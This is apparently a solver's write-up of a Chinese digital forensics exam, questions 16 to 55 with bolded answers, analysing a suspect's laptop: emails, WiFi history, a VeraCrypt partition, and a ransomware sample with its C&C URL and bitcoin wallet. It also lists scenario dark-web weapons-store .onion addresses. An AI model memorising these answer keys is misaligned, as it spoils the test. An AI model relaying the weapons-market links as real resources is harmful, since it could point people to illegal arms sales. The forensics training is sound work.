UTC</td></tr><tr><td>D.</td><td>2017-10-31  4:55:54 UTC</td></tr><tr><td>E.</td><td>2017-10-31  4:56:54 UTC</td></tr></tbody></table><p><img src="16-1.png" alt="16-1"></p><p>其中取证结果-》系统痕迹-》系统开关机时间</p><p>中也能看到关机时间，但与本题不符。为什么会出现这种情况呢？</p><p><img src="16-2.png" alt="16-2"></p><p>本人认为，此处的逻辑顺序应为：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2017-10-31 11:53:38（正常）开机</span><br><span class="line">2017-10-31 ？：？：？关闭电源（非正常关机）</span><br><span class="line">2017-10-31 12:52:54（正常）关机</span><br></pre></td></tr></table></figure><h4><span id="17电脑名称">17：电脑名称</span></h4><table><thead><tr><th>17</th><th>该Windows系统中，下列哪个是电脑名称?</th></tr></thead><tbody><tr><td>A.</td><td>GARYPC</td></tr><tr><td><strong>B.</strong></td><td><strong>GARY-PC</strong></td></tr><tr><td>C.</td><td>GARY_PC</td></tr><tr><td>D.</td><td>GARY</td></tr><tr><td>E.</td><td>GARY-NB</td></tr></tbody></table><p><img src="17-1.png" alt="17-1"></p><h4><span id="18邮箱账号">18：邮箱账号</span></h4><table><thead><tr><th>18</th><th>在该Windows系统中，下列哪个是用户Gary日常使用的邮箱帐号?</th></tr></thead><tbody><tr><td>A.</td><td><a href="mailto:ics_user@mail.com">ics_user@mail.com</a></td></tr><tr><td>B.</td><td><a href="mailto:ics_user@gmail.com">ics_user@gmail.com</a></td></tr><tr><td>C.</td><td><a href="mailto:gary@mail.com">gary@mail.com</a></td></tr><tr><td><strong>D.</strong></td><td><strong><a href="mailto:gary_chen@mail.com">gary_chen@mail.com</a></strong></td></tr><tr><td>E.</td><td><a href="mailto:gary_chen@gmail.com">gary_chen@gmail.com</a></td></tr></tbody></table><p><img src="18-1.png" alt="18-1"></p><h4><span id="19邮件记录">19：邮件记录</span></h4><table><thead><tr><th>19</th><th>在该Windows系统中，用户Gary曾经收过一封来自邮箱帐号 <a href="mailto:ics_user@mail.com">ics_user@mail.com</a> 的邮件，内容提及有关制作钓鱼网站及邮件帐号eric_wang99@outlook.com，下列哪个是此封邮件的发送日期和时间?</th></tr></thead><tbody><tr><td>A.</td><td>2017-09-25  17:07:15</td></tr><tr><td>B.</td><td>2017-10-17  14:35:45</td></tr><tr><td><strong>C.</strong></td><td><strong>2017-10-17  18:24:02</strong></td></tr><tr><td>D.</td><td>2017-10-26  19:17:08</td></tr><tr><td>E.</td><td>2017-10-26  19:24:57</td></tr></tbody></table><p>实时搜索【eric_wang99@outlook.com】</p><p>查看邮件记录</p><p><img src="19-1.png" alt="19-1"></p><h4><span id="20同19题">20：同19题</span></h4><table><thead><tr><th>20</th><th>在该Windows系统中，用户Gary还曾经收过两封来自邮箱帐号 eric_wang99@outlook.com的邮件，标题为“学习制作网站”，下列哪个是<u>第一封</u>邮件的发送日期和时间?</th></tr></thead><tbody><tr><td>A.</td><td>2017-09-25  17:07:15</td></tr><tr><td>B.</td><td>2017-10-17  14:35:45</td></tr><tr><td>C.</td><td>2017-10-17  18:24:02</td></tr><tr><td><strong>D.</strong></td><td><strong>2017-10-18  18:30:45</strong></td></tr><tr><td>E.</td><td>2017-10-18  19:38:05</td></tr></tbody></table><p>这里有一个逻辑拐点，【下列】之前是前情提要，之后是问题。</p><p>认真读题后意思是：</p><p><strong>第一封</strong>\<strong>来自</strong> eric_wang99@outlook.com的发送日期和时间是？</p><p><img src="20-1.png" alt="20-1"></p><p>而摘要中的时间则表明</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2017-10-18 18:15 gary编辑</span><br><span class="line">2017-10-18 18:30:45 发送</span><br></pre></td></tr></table></figure><h4><span id="21同19题">21：同19题</span></h4><table><thead><tr><th>21</th><th>在该Windows系统中，用户Gary还曾经收过两封来自邮箱帐号 <a href="mailto:eric_wang99@outlook.com">eric_wang99@outlook.com</a>邮件，标题为“学习制作网站”，下列哪个是第二封电邮的发送日期和时间?</th></tr></thead><tbody><tr><td>A.</td><td>2017-09-25  17:07:15</td></tr><tr><td>B.</td><td>2017-10-17  14:35:45</td></tr><tr><td>C.</td><td>2017-10-17  18:24:02</td></tr><tr><td>D.</td><td>2017-10-18  18:30:45</td></tr><tr><td><strong>E.</strong></td><td><strong>2017-10-18  19:38:05</strong></td></tr></tbody></table><p><img src="21-1.png" alt="21-1"></p><h4><span id="22同19题">22：同19题</span></h4><table><thead><tr><th>22</th><th>用戶Gary亦曾經收過一封來自電郵帳號  <a href="mailto:ics_user@mail.com">ics_user@mail.com</a> 的電郵，附加了兩張與咖啡豆有關的相片，下列那個是此封電郵之發送日期及時間?</th></tr></thead><tbody><tr><td>A.</td><td>2017-09-25  17:07:15</td></tr><tr><td>B.</td><td>2017-10-17  14:35:45</td></tr><tr><td>C.</td><td>2017-10-17  18:24:02</td></tr><tr><td><strong>D.</strong></td><td><strong>2017-10-26  19:17:08</strong></td></tr><tr><td>E.</td><td>2017-10-26  19:24:57</td></tr></tbody></table><p><img src="22-1.png" alt="22-1"></p><h4><span id="23导出附件查看md5">23：导出附件，查看MD5</span></h4><table><thead><tr><th>23</th><th>下列那項是與上述咖啡豆有關相片的MD5哈希值/哈希值(Hash value)?</th></tr></thead><tbody><tr><td>A.</td><td>449cebf0eb96499df047fe0bff8e1627</td></tr><tr><td><strong>B.</strong></td><td><strong>17f9c6bcca44d128f7ed6769a6920278</strong></td></tr><tr><td>C.</td><td>4bc48ce355acd4732f33a79e29728e96</td></tr><tr><td>D.</td><td>4bc48ce355acd4732f33a79e29728e97</td></tr><tr><td>E.</td><td>e3e545c80a7273b7b0d7c73dacdd7227</td></tr></tbody></table><p>找到题目中的两张图</p><p><img src="23-2.png" alt="23-2"></p><p>右键导出</p><p><img src="23-1.png" alt="23-1"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;certutil -hashfile 202141514292669coffee-beans2.jpg MD5</span><br><span class="line">MD5 的 202141514292669coffee-beans2.jpg 哈希:</span><br><span class="line">3af01d89376adf829049967c52ad0799</span><br><span class="line">CertUtil: -hashfile 命令成功完成。</span><br><span class="line"></span><br><span class="line">&gt;certutil -hashfile 202141514292676ROASTED-COFFEE-BEANS.jpg MD5</span><br><span class="line">MD5 的 202141514292676ROASTED-COFFEE-BEANS.jpg 哈希:</span><br><span class="line">17f9c6bcca44d128f7ed6769a6920278</span><br><span class="line">CertUtil: -hashfile 命令成功完成。</span><br></pre></td></tr></table></figure><h4><span id="24同23题">24：同23题</span></h4><table><thead><tr><th>24</th><th>在该Windows系统中，用户Gary还曾经收到一封来自邮箱帐号 <a href="mailto:eric_wang99@outlook.com">eric_wang99@outlook.com</a> 的邮件，附加有三张与Apple iCloud相关的相片，下列哪个为该封邮件的发送日期和时间?</th></tr></thead><tbody><tr><td>A.</td><td>2017-09-25  17:07:15</td></tr><tr><td>B.</td><td>2017-10-17  14:35:45</td></tr><tr><td>C.</td><td>2017-10-17  18:24:02</td></tr><tr><td>D.</td><td>2017-10-18  18:30:45</td></tr><tr><td><strong>E.</strong></td><td><strong>2017-10-18  19:38:05</strong></td></tr></tbody></table><p><img src="24-1.png" alt="24-1"></p><h4><span id="25连接wifi">25：连接WIFI</span></h4><table><thead><tr><th>25</th><th>Gary经常使用笔记本电脑浏览互联网，他的笔记本电脑上曾经连接过多少WIFI热点？</th></tr></thead><tbody><tr><td>A.</td><td>1</td></tr><tr><td>B.</td><td>2</td></tr><tr><td>C.</td><td>3</td></tr><tr><td><strong>D.</strong></td><td><strong>4</strong></td></tr><tr><td>E.</td><td>5</td></tr></tbody></table><p><img src="25-1.png" alt="25-1"></p><h4><span id="26全局唯一识别元globally-unique-identifier-guid">26：全局唯一识别元（Globally Unique Identifier, GUID）</span></h4><table><thead><tr><th>26</th><th>上述电脑曾经连接过星巴克WIFI热点，下列哪项是其全局唯一识别元（Globally Unique Identifier, GUID）？</th></tr></thead><tbody><tr><td>A.</td><td>{8039D237-A346-4BA1-9B78-5752580ED7F0}</td></tr><tr><td>B.</td><td>{39489FA0-DE35-4989-8730-E2E2ED15E85A}</td></tr><tr><td>C.</td><td>{558B94DF-8D68-4779-AA25-65FBDAB4C2B9}</td></tr><tr><td>D.</td><td>{4EFCDA7E-CE51-4EC2-8980-8629647C9968}</td></tr><tr><td><strong>E.</strong></td><td><strong>{AF0778E8-6C4F-41C6-84B2-CB14490CF29E}</strong></td></tr></tbody></table><p><u><strong>用于指示产品的唯一性安装。在许多流行软件应用程序（例如 Web 浏览器和媒体播放器）中，都使用 GUID 网络GUID、网卡GUID</strong></u></p><p><img src="26-1.png" alt="26-1"></p><p><img src="26-2.png" alt="26-2"></p><h4><span id="27ip地址">27：IP地址</span></h4><table><thead><tr><th>27</th><th>有关Gary的笔记本电脑，下列哪项是其最后分派得到的IP地址？</th></tr></thead><tbody><tr><td>A.</td><td>192.168.0.1</td></tr><tr><td>B.</td><td>192.168.10.4</td></tr><tr><td>C.</td><td>192.168.20.6</td></tr><tr><td><strong>D.</strong></td><td><strong>192.168.30.3</strong></td></tr><tr><td>E.</td><td>192.168.40.5</td></tr></tbody></table><p><img src="27-1.png" alt="27-1"></p><h4><span id="28查看url">28：查看URL</span></h4><table><thead><tr><th>28</th><th>Eric曾发邮件给Gary，内容是关于如何在暗网(Dark Web)中浏览枪械的信息，以下哪个URL是由Eric提供的?</th></tr></thead><tbody><tr><td>A.</td><td><a href="http://hhnovpxmqrw5xaqg.onion">http://hhnovpxmqrw5xaqg.onion</a></td></tr><tr><td><strong>B.</strong></td><td><strong><a href="http://gunsjmzh2btr7lpy.onion">http://gunsjmzh2btr7lpy.onion</a></strong></td></tr><tr><td>C.</td><td><a href="http://gunsdtk58tolcrre.onion">http://gunsdtk58tolcrre.onion</a></td></tr><tr><td>D.</td><td><a href="http://armoryohajjhou6m.onion">http://armoryohajjhou6m.onion</a></td></tr><tr><td>E.</td><td><a href="http://armory45jijdf7d.onion">http://armory45jijdf7d.onion</a></td></tr></tbody></table><p>邮件记录没东西，查看附件</p><p>在【好东西.docx】里看到四个Deep web weapons Store Links</p><p>涉及</p><p><a href="http://hhnovpxmqrw4xaqg.onion/">http://hhnovpxmqrw4xaqg.onion/</a></p><p><a href="http://armoryohajjhou5m.onion/">http://armoryohajjhou5m.onion/</a></p><p><a href="http://gunsjmzh2btr7lpy.onion/">http://gunsjmzh2btr7lpy.onion/</a></p><p><a href="http://gunsdtk47tolcrre.onion/">http://gunsdtk47tolcrre.onion/</a></p><p>无法分辨</p><p>查看其他图片附件</p><p><img src="28-1.png" alt="28-1"></p><h4><span id="29简单信息分析">29：简单信息分析</span></h4><table><thead><tr><th>29</th><th>Eric 售卖iCloud 网站给Gary 的价钱是多少?</th></tr></thead><tbody><tr><td>A.</td><td>$500</td></tr><tr><td>B.</td><td>$800</td></tr><tr><td><strong>C.</strong></td><td><strong>$1000</strong></td></tr><tr><td>D.</td><td>$1400</td></tr><tr><td>E.</td><td>$1500</td></tr></tbody></table><p>找到Eric发给Gary的文件，关键词出现在邮件主题“网站价钱”</p><p><img src="29-1.png" alt="29-1"></p><h4><span id="30识别常用软件">30：识别常用软件</span></h4><table><thead><tr><th>30</th><th>Gary 经常将非法文件存储到该笔记本电脑的加密分区中，下列哪一个为该加密软件?</th></tr></thead><tbody><tr><td>A.</td><td>TrueCrypt</td></tr><tr><td><strong>B.</strong></td><td><strong>VeraCrypt</strong></td></tr><tr><td>C.</td><td>Bitlocker</td></tr><tr><td>D.</td><td>LUKS</td></tr><tr><td>E.</td><td>PGP WDE</td></tr></tbody></table><p>选项中提到的所有软件都为加密软件，</p><p>系统痕迹-》安装软件-》其他软件</p><p>发现B选项</p><p><img src="30-1.png" alt="30-1"></p><h4><span id="31同23题">31：同23题</span></h4><table><thead><tr><th>31</th><th>在加密磁区内有三张与Apple iCloud有关的相片，下列哪个为其中一张相片的MD5哈希值(Hash  Value)?</th></tr></thead><tbody><tr><td><strong>A.</strong></td><td><strong>c9fbfaf3c45492c40feb83a83217f146</strong></td></tr><tr><td>B.</td><td>14903a7bd9d709b653f9afe8e3e51cdd</td></tr><tr><td>C.</td><td>7cb0f29812317db645edbcd6cf46e1ba</td></tr><tr><td>D.</td><td>5503d096bdf832460c8f51da62fbbb5d</td></tr><tr><td>E.</td><td>9918465b62171ba2c0a95595db629bf3</td></tr></tbody></table><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;certutil -hashfile 202141514292583icloud1.png MD5</span><br><span class="line">MD5 的 202141514292583icloud1.png 哈希:</span><br><span class="line">d84ceb0d3f25996a8926c442a9021d89</span><br><span class="line">CertUtil: -hashfile 命令成功完成。</span><br><span class="line"></span><br><span class="line">&gt;certutil -hashfile 202141514292595icloud2.png MD5</span><br><span class="line">MD5 的 202141514292595icloud2.png 哈希:</span><br><span class="line">c9fbfaf3c45492c40feb83a83217f146</span><br><span class="line">CertUtil: -hashfile 命令成功完成。</span><br><span class="line"></span><br><span class="line">&gt;certutil -hashfile 202141514292598icloud3.png MD5</span><br><span class="line">MD5 的 202141514292598icloud3.png 哈希:</span><br><span class="line">a46bf504f78ae6688fcada85a40de826</span><br><span class="line">CertUtil: -hashfile 命令成功完成。</span><br></pre></td></tr></table></figure><h4><span id="32同23题">32：同23题</span></h4><table><thead><tr><th>32</th><th>在加密磁区内有三张与暗网(Dark Web)有关的相片，下列哪个为其中一张相片的MD5哈希值(Hash  Value)?</th></tr></thead><tbody><tr><td>A.</td><td>2836d35fb45c591211d5b6865c4a82f5</td></tr><tr><td>B.</td><td>d2b14799050b6c4ad6b07cd1227b91a5</td></tr><tr><td>C.</td><td>9110c96baa70c00acd8fbdfe2dc7c397</td></tr><tr><td>D.</td><td>703899985d881e2d103eb4fd1306be2e</td></tr><tr><td><strong>E.</strong></td><td><strong>4c57a45b8da5ea01e5eb7d875f94a7b8</strong></td></tr></tbody></table><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;certutil -hashfile 202141514293877Screenshot 1.png MD5</span><br><span class="line">MD5 的 202141514293877Screenshot 1.png 哈希:</span><br><span class="line">144d3601d02e171f87b3291ff6076a17</span><br><span class="line">CertUtil: -hashfile 命令成功完成。</span><br><span class="line"></span><br><span class="line">&gt;certutil -hashfile 202141514293990Screenshot 2.png MD5</span><br><span class="line">MD5 的 202141514293990Screenshot 2.png 哈希:</span><br><span class="line">bb6d34c6573223794a6283f787268fc8</span><br><span class="line">CertUtil: -hashfile 命令成功完成。</span><br><span class="line"></span><br><span class="line">&gt;certutil -hashfile 20214151429495Screenshot 3.png MD5</span><br><span class="line">MD5 的 20214151429495Screenshot 3.png 哈希:</span><br><span class="line">4c57a45b8da5ea01e5eb7d875f94a7b8</span><br><span class="line">CertUtil: -hashfile 命令成功完成。</span><br></pre></td></tr></table></figure><h4><span id="33计算机系统时区">33：计算机系统时区</span></h4><table><thead><tr><th>33</th><th>Gary的计算机系统时区是什么？?</th></tr></thead><tbody><tr><td><strong>A.</strong></td><td><strong>中国标准时间</strong></td></tr><tr><td>B.</td><td>日本标准时间</td></tr><tr><td>C.</td><td>泰国标准时间</td></tr><tr><td>D.</td><td>新加坡标准时间</td></tr><tr><td>E.</td><td>伦敦标准时间</td></tr></tbody></table><p><img src="33-1.png" alt="33-1"></p><h4><span id="34简单信息分析">34：简单信息分析</span></h4><table><thead><tr><th>34</th><th>在上述加密磁区内，存有一个名为”2017-10-27”的文件夹，内有三张枪械的图片，该三张图片是来自哪个网站?</th></tr></thead><tbody><tr><td>A.</td><td><a href="http://gunsdtk58tolcrre.onion">http://gunsdtk58tolcrre.onion</a></td></tr><tr><td><strong>B.</strong></td><td><strong><a href="http://gunsjmzh2btr7lpy.onion">http://gunsjmzh2btr7lpy.onion</a></strong></td></tr><tr><td>C.</td><td><a href="http://thegunstorelasvegas.com">thegunstorelasvegas.com</a></td></tr><tr><td>D.</td><td><a href="http://cabelas.com">cabelas.com</a></td></tr><tr><td>E.</td><td><a href="http://hyattgunstore.com">hyattgunstore.com</a></td></tr></tbody></table><p>实时搜索【2017-10-27】</p><p>发现用户痕迹中，最近访问的文档</p><p><img src="34-1.png" alt="34-1"></p><p>路径对上了</p><p>E:\2017-10-27\Screenshot 1.png</p><p>锁定该图片</p><p>想起之前接触的同名文件出现在邮件附件中</p><p><img src="34-2.png" alt="34-2"></p><p>参考28题</p><h4><span id="35简单信息分析">35：简单信息分析</span></h4><table><thead><tr><th>35</th><th>Gary的笔记本电脑曾经下载过多少张有关恐怖组织的图片?</th></tr></thead><tbody><tr><td>A.</td><td>1</td></tr><tr><td><strong>B.</strong></td><td><strong>2</strong></td></tr><tr><td>C.</td><td>3</td></tr><tr><td>D.</td><td>4</td></tr><tr><td>E.</td><td>5</td></tr></tbody></table><p>根据经验常识，笔记本电脑的下载路径默认在<strong>C:\Users\用户名\Downloads</strong></p><p>考虑到常用用户Gary</p><p>找到该文件夹</p><p>个人认为这道题极易出错，按照官方答案选择B，存在isis.jpg和isis2.jpg</p><p><img src="35-1.png" alt="35-1"></p><p>但通过浏览发现其他两张图片，颇具恐怖组织色彩</p><p><img src="35-2.png" alt="35-2"></p><p>不解</p><h4><span id="36同19题">36：同19题</span></h4><table><thead><tr><th>36</th><th>根据Gary与Eric邮件的内容，Eric曾经提供Gary一个私有云盘，下列哪项是该邮件提供的资料?</th></tr></thead><tbody><tr><td>A.</td><td>动物图</td></tr><tr><td><strong>B.</strong></td><td><strong>枪的结构图</strong></td></tr><tr><td>C.</td><td>博彩图</td></tr><tr><td>D.</td><td>博彩文件</td></tr><tr><td>E.</td><td>恐怖主义图</td></tr></tbody></table><p><img src="36-1.png" alt="36-1"></p><h4><span id="37同19题">37：同19题</span></h4><table><thead><tr><th>37</th><th>下列哪项是上述私有云盘的网址?</th></tr></thead><tbody><tr><td>A.</td><td><a href="http://mantech.mooo.cn">http://mantech.mooo.cn</a></td></tr><tr><td><strong>B.</strong></td><td><strong><a href="http://mantech.mooo.com">http://mantech.mooo.com</a></strong></td></tr><tr><td>C.</td><td><a href="http://mooo.com">http://mooo.com</a></td></tr><tr><td>D.</td><td><a href="http://mantech.com">http://mantech.com</a></td></tr><tr><td>E.</td><td><a href="http://23.54.45.113">http://23.54.45.113</a></td></tr></tbody></table><h4><span id="38同19题">38：同19题</span></h4><table><thead><tr><th>38</th><th>下列哪项是上述私有云盘网址的连接端口?</th></tr></thead><tbody><tr><td>A.</td><td>TCP 80</td></tr><tr><td>B.</td><td>TCP 8080</td></tr><tr><td>C.</td><td>UDP 80</td></tr><tr><td><strong>D.</strong></td><td><strong>TCP 8000</strong></td></tr><tr><td>E.</td><td>TCP 443</td></tr></tbody></table><h4><span id="39查看上网痕迹">39：查看上网痕迹</span></h4><table><thead><tr><th>39</th><th>下列哪项是Gary第一次浏览该私有云盘网址时，所使用的浏览器?</th></tr></thead><tbody><tr><td>A.</td><td>Microsoft  Explorer</td></tr><tr><td>B.</td><td>Google  Chrome</td></tr><tr><td><strong>C.</strong></td><td><strong>Mozilla  Firefox</strong></td></tr><tr><td>D.</td><td>Opera</td></tr><tr><td>E.</td><td>QQ 浏览器</td></tr></tbody></table><p><img src="39-1.png" alt="39-1"></p><p>通过搜索云盘地址得到</p><h4><span id="40同39题">40：同39题</span></h4><table><thead><tr><th>40</th><th>下列哪项是Gary第一次浏览该私有云盘网址的日期和时间?</th></tr></thead><tbody><tr><td>A.</td><td>2017-10-29  12:42:09</td></tr><tr><td><strong>B.</strong></td><td><strong>2017-10-30  12:42:09</strong></td></tr><tr><td>C.</td><td>2017-10-31  12:42:09</td></tr><tr><td>D.</td><td>2017-10-30  10:42:09</td></tr><tr><td>E.</td><td>2017-10-30  11:42:09</td></tr></tbody></table><p><img src="40-1.png" alt="40-1"></p><p>最接近的为B选项</p><h4><span id="41查看下载方式">41：查看下载方式</span></h4><table><thead><tr><th>41</th><th>在上述加密磁区内，存有一个名为”2017-10-30”的文件夹，里面有三张与枪械结构有关的图片，该三张图片是从哪个方法/软件下载?</th></tr></thead><tbody><tr><td>A.</td><td>邮件</td></tr><tr><td><strong>B.</strong></td><td><strong>Firefox</strong></td></tr><tr><td>C.</td><td>Chrome</td></tr><tr><td>D.</td><td>USB thumb  drive</td></tr><tr><td>E.</td><td>ftp</td></tr></tbody></table><p><img src="41-1.png" alt="41-1"></p><h4><span id="42查看下载时间">42：查看下载时间</span></h4><table><thead><tr><th>42</th><th>Gary的笔记本电脑，曾经下载过一个感染了电脑病毒的文件，名为invoice.zip。该病毒程序文件是什么时候下载?</th></tr></thead><tbody><tr><td>A.</td><td>2017-10-31  12:26:20</td></tr><tr><td>B.</td><td>2017-10-31  12:50:34</td></tr><tr><td>C.</td><td>2017-10-31  12:29:55</td></tr><tr><td>D.</td><td>2017-10-31  10:52:10</td></tr><tr><td><strong>E.</strong></td><td><strong>2017-10-31  12:18:54</strong></td></tr></tbody></table><p><img src="42-1.png" alt="42-1"></p><h4><span id="43最后存取日期时间">43：最后存取日期/时间</span></h4><table><thead><tr><th>43</th><th>Gary的笔记本电脑，还存有一个感染了电脑病毒的程序文件，名为\User\Gary\Downloads\invoice\dist\invoice.exe。该文件的<u>最后存取日期/时间(Last Accessed Data/Time)</u> 是什么?</th></tr></thead><tbody><tr><td><strong>A.</strong></td><td><strong>2017-10-31  12:26:27</strong></td></tr><tr><td>B.</td><td>2017-10-31  12:50:34</td></tr><tr><td>C.</td><td>2017-10-31 12:29:55</td></tr><tr><td>D.</td><td>2017-10-31  10:52:10</td></tr><tr><td>E.</td><td>2017-10-31  12:18:54</td></tr></tbody></table><p>这道题拐弯的点在于</p><p>通过实时搜索得到两条关于【invoice.exe】的记录</p><p>但题干其实把范围只限定在了Downloads里的那一个</p><p>关于他的最后存取时间为A</p><p><img src="43-1.png" alt="43-1"></p><h4><span id="44文件伪装">44：文件伪装</span></h4><table><thead><tr><th>44</th><th>上述的invoice.exe文件伪装成什么格式的软件?</th></tr></thead><tbody><tr><td><strong>A.</strong></td><td><strong>pdf</strong></td></tr><tr><td>B.</td><td>jpg</td></tr><tr><td>C.</td><td>psd</td></tr><tr><td>D.</td><td>Docx</td></tr><tr><td>E.</td><td>Doc</td></tr></tbody></table><p>同样是上一题的环境，导出后依然是exe，看不出什么</p><p>丢进32位系统，得到</p><p><img src="44-1.png" alt="44-1"></p><p>选择选项A</p><p><img src="44-2.png" alt="44-2"></p><h4><span id="45最后执行日期时间">45：最后执行日期/时间</span></h4><table><thead><tr><th>45</th><th>上述的\User\Gary\Downloads\invoice\dist\invoice.exe文件，<u>最后执行日期/时间(Last Accessed Data/Time)</u> 是什么?</th></tr></thead><tbody><tr><td>A.</td><td>2017-10-31  12:26:27</td></tr><tr><td><strong>B.</strong></td><td><strong>2017-10-31  12:50:34</strong></td></tr><tr><td>C.</td><td>2017-10-31  12:29:55</td></tr><tr><td>D.</td><td>2017-10-31  10:52:10</td></tr><tr><td>E.</td><td>2017-10-31  12:18:54</td></tr></tbody></table><h4><span id="46加密文件类型">46：加密文件类型?</span></h4><table><thead><tr><th>46</th><th>事实上，Gary的笔记本电脑被电脑病毒感染了，部份文件被加密，当中包括下列哪种文件类型?</th></tr></thead><tbody><tr><td>a.</td><td>exe</td></tr><tr><td>b.</td><td>gif</td></tr><tr><td>c.</td><td>jpg</td></tr><tr><td>d.</td><td>psd</td></tr><tr><td>e.</td><td>Docx</td></tr><tr><td>f.</td><td>Doc</td></tr><tr><td></td><td></td></tr><tr><td>A.</td><td>只有(a)  &amp; (b)</td></tr><tr><td>B.</td><td>(a), (b), (d) &amp; (f)</td></tr><tr><td>C.</td><td>(b), ©, (d) &amp; (f)</td></tr><tr><td>D.</td><td>(b),  ©, (e) &amp; (f)</td></tr><tr><td>E.</td><td>以上皆是</td></tr></tbody></table><h4><span id="47执行次数">47：执行次数</span></h4><table><thead><tr><th>47</th><th>上述\User\Gary\Downloads\invoice\dist\invoice.exe文件共执行多少?</th></tr></thead><tbody><tr><td>A.</td><td>1</td></tr><tr><td>B.</td><td>2</td></tr><tr><td>C.</td><td>3</td></tr><tr><td>D.</td><td>4</td></tr><tr><td><strong>E.</strong></td><td><strong>5</strong></td></tr></tbody></table><p>实时搜索-》用户痕迹-》最近访问记录-》最近程序访问记录</p><p><img src="47-1.png" alt="47-1"></p><h4><span id="48查看由什么程序编写">48：查看由什么程序编写</span></h4><table><thead><tr><th>48</th><th>上述\User\Gary\Downloads\invoice\dist\invoice.exe文件是由什么程序编写?</th></tr></thead><tbody><tr><td>A.</td><td>LISP</td></tr><tr><td>B.</td><td>C++</td></tr><tr><td>C.</td><td>Visual Basic</td></tr><tr><td><strong>D.</strong></td><td><strong>Python</strong></td></tr><tr><td>E.</td><td>Java</td></tr></tbody></table><p>在查找【invoice.exe】无果后</p><p>exe本质上是压缩包</p><p>关键词查找【invoice】，发现invoice.zip</p><p><img src="48-1.png" alt="48-1"></p><p>导出后查看</p><p><img src="48-2.png" alt="48-2"></p><h4><span id="49查找调用的动态连结函式库">49：查找调用的动态连结函式库</span></h4><table><thead><tr><th>49</th><th>上述\User\Gary\Downloads\invoice\dist\invoice.exe文件，执行时会呼叫下列哪个动态连结函式库(Dynamic Linked Library)</th></tr></thead><tbody><tr><td><strong>A.</strong></td><td><strong>KERNEL32.DLL</strong></td></tr><tr><td>B.</td><td>USER32.DLL</td></tr><tr><td>C.</td><td>SHELL32.DLL</td></tr><tr><td>D.</td><td>NTDLL.DLL</td></tr><tr><td>E.</td><td>SYSTEM32.DLL</td></tr></tbody></table><p>询问了队里的RE大手子，得到一个工具CFF Explorer VIII</p><p>打开对应的文件夹，查看导入目录</p><p><img src="49-1.png" alt="49-1"></p><p>选择选项A</p><p>但大手子强调，如果这道题是多选题的话，多半还需要加上D选项，因为ntdll模块主要是处理异常和查询一些进程重要信息，模块出现异常时调用几乎是必然。</p><h4><span id="50同43题">50：同43题</span></h4><table><thead><tr><th>50</th><th>Gary的笔记本电脑，还存有另一感染了电脑病毒的程序文件，名为\tmp\invoice.exe。该文件的最后存取日期/时间(Last Accessed Data/Time) 是什么?</th></tr></thead><tbody><tr><td>A.</td><td>2017-10-31  12:26:27</td></tr><tr><td><strong>B.</strong></td><td><strong>2017-10-31  12:50:34</strong></td></tr><tr><td>C.</td><td>2017-10-31  12:29:55</td></tr><tr><td>D.</td><td>2017-10-31  10:52:10</td></tr><tr><td>E.</td><td>2017-10-31  12:18:54</td></tr></tbody></table><h4><span id="51文件之间的关系">51：文件之间的关系</span></h4><table><thead><tr><th>51</th><th>上述两个文件\User\Gary\Downloads\invoice\dist\invoice.exe和 \tmp\invoice.exe是什么关系?</th></tr></thead><tbody><tr><td>A.</td><td>前者是后者的复本</td></tr><tr><td><strong>B.</strong></td><td><strong>后者是前者的复本</strong></td></tr><tr><td>C.</td><td>两者MD5不相同</td></tr><tr><td>D.</td><td>两者元数据(Metadata)相同</td></tr><tr><td>E.</td><td>两者无关系</td></tr></tbody></table><h4><span id="52查看上网痕迹">52：查看上网痕迹</span></h4><table><thead><tr><th>52</th><th>根据勒索讯息的显示，勒索网址是什么？</th></tr></thead><tbody><tr><td>A.</td><td><a href="http://223.17.250.208:6000/C&amp;C/">http://223.17.250.208:6000/C&amp;C/</a></td></tr><tr><td>B.</td><td><a href="http://223.17.250.208/C&amp;C/">http://223.17.250.208/C&amp;C/</a></td></tr><tr><td><strong>C.</strong></td><td><strong><a href="http://223.17.250.208:6060/C&amp;C/">http://223.17.250.208:6060/C&amp;C/</a></strong></td></tr><tr><td>D.</td><td><a href="http://223.17.250.208:80/C&amp;C/">http://223.17.250.208:80/C&amp;C/</a></td></tr><tr><td>E.</td><td><a href="http://223.17.250.208:8080/C&amp;C/">http://223.17.250.208:8080/C&amp;C/</a></td></tr></tbody></table><p>通过实时搜索，除了C选项，其他都没有相关结果</p><h4><span id="53复杂信息分析">53：复杂信息分析</span></h4><table><thead><tr><th>53</th><th>根据勒索讯息的显示，勒索金额是多少钱？</th></tr></thead><tbody><tr><td>A.</td><td>$1,000</td></tr><tr><td><strong>B.</strong></td><td><strong>$10,000</strong></td></tr><tr><td>C.</td><td>$20,000</td></tr><tr><td>D.</td><td>$50,000</td></tr><tr><td>E.</td><td>$100,000</td></tr></tbody></table><p>上题的勒索网站打开失败，</p><p>应该是网站无人维护的问题。</p><p>一通搜索，在主用户的桌面</p><p>C:\Users\Gary\Desktop</p><p>发现screen.png</p><p><img src="53-1.png" alt="53-1"></p><h4><span id="54复杂信息分析">54：复杂信息分析</span></h4><table><thead><tr><th>54</th><th>根据勒索讯息的显示，下列哪个是与勒索案件有关的比特币钱包？</th></tr></thead><tbody><tr><td>A.</td><td>1KcjhpkowGWh5QYgPx5hYGuzbZpewgBszh</td></tr><tr><td><strong>B.</strong></td><td><strong>1KcjhpknwGWh5QYgPx5hYGuzbZpewgBszh</strong></td></tr><tr><td>C.</td><td>1KcjhpknwGWh5QYgPx5hYGuzbZpewgBzzh</td></tr><tr><td>D.</td><td>1KcjhpknwGWh5QYgPx6hYGuzbZpewgBszh</td></tr><tr><td>E.</td><td>1KcjhpknwGWh6QYgPx5hYGuzbZpewgBszh</td></tr></tbody></table><h4><span id="55复杂信息分析">55：复杂信息分析</span></h4><table><thead><tr><th>55</th><th>执法机关曾在现场对Gary的电脑进行电子法证检验，期间曾撷取与勒索软件相关的屏幕影像，并储存为png格式。下列哪项是其储存位置?</th></tr></thead><tbody><tr><td>A.</td><td>\Users\彼得\Downloads\</td></tr><tr><td>B.</td><td>\Users\彼得\Desktop\</td></tr><tr><td>C.</td><td>\Users\Gary\Downloads\</td></tr><tr><td><strong>D.</strong></td><td><strong>\Users\Gary\Desktop</strong></td></tr><tr><td>E.</td><td>\Users\Gary\Documents</td></tr></tbody></table>]]></content>
    
    
      
      
